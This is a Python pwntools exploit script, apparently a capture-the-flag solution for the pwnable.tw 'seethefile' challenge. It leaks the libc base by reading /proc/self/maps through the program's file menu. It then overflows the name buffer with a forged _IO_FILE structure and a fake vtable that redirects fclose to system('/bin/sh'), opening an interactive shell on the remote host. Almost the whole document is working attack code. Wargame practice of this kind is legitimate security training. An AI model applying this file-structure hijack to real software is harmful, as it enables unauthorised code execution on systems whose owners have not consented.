from pwn import *

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './seethefile_patched'
LIBC = ELF('./libc.so.6')  # Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10200)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, '''b* fclose''')


#####################
#### Find Gadgets ###
#####################


# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]  # Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################


##########################
##### FUNCTION ######
##########################

def open(fileName):
    P.sendlineafter(b'choice :', b'1')
    P.sendlineafter(b'see :', fileName)


def read():
    P.sendlineafter(b'choice :', b'2')


def write():
    P.sendlineafter(b'choice :', b'3')


def close():
    P.sendlineafter(b'choice :', b'4')


def exit():
    P.sendlineafter(b'choice :', b'5')

##############################
##### FINAL EXPLOITATION #####
##############################
open(b'/proc/self/maps')
read()
read()
write()
P.recvline()
# P.recvline()
LIBC.address = int(P.recv(8),16)
print(hex(LIBC.address))
exit()

fake_IO_file = b''
fake_IO_file += b'/bin/sh\x00'
fake_IO_file += b'\x00'*4*16
fake_IO_file += p32(ELF_LOADED.sym['name'])
fake_IO_file += b'\x00'*4*18
fake_IO_file += p32(ELF_LOADED.sym['name']+36+38*4)

fake_vtable = b'\x00'*4*17
fake_vtable += p32(LIBC.sym['system'])

payload = b''
payload += b'\x00'*32 + p32(ELF_LOADED.sym['name']+36)
payload += fake_IO_file
payload += fake_vtable
P.sendlineafter(b'name :',payload)

P.interactive()
